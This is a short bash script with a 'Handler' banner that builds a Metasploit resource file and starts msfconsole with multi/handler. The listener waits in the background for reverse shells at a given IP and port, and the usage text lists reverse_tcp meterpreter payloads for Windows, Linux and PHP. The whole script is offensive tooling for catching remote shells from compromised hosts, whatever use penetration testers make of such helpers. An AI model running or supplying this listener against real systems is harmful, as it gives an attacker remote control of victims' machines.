#!/bin/bash

echo -e "\e[33m   ___ ___                    .___.__                 "
echo -e "\e[33m  /   |   \_____    ____    __| _/|  |   ___________  "
echo -e "\e[33m /    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \ "
echo -e "\e[33m \    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/ "
echo -e "\e[33m  \___|_  /(____  /___|  /\____ | |____/\___  >__|    "
echo -e "\e[33m                \/      \/     \/      \/   \/        "

if [ $# -ne 3 ]; then
    echo -e "\e[39m"
    echo "usage: $0 <payload> <ip> <port>";
    echo ""
    echo "common payloads:"
    echo "windows/meterpreter/reverse_tcp       windows/x64/meterpreter/reverse_tcp"
    echo "linux/x64/meterpreter/reverse_tcp     linux/x86/metepreter/reverse_tcp"
    echo "generic/shell_reverse_tcp             php/metepreter/reverse_tcp"
    echo ""
    exit 1;
fi

echo -e "\e[39m"

rm msf.rc 2> /dev/null
touch msf.rc

echo use exploit/multi/handler >> msf.rc
echo set PAYLOAD $1 >> msf.rc; 
echo set LHOST $2 >> msf.rc; 
echo set LPORT $3 >> msf.rc;
echo set ExitOnSession false >> msf.rc; 
echo exploit -j -z >> msf.rc; 

echo -e "[\e[33m*\e[25m\e[39m] Starting Metasploit Framework resource file - msf.rc"
msfconsole -r msf.rc
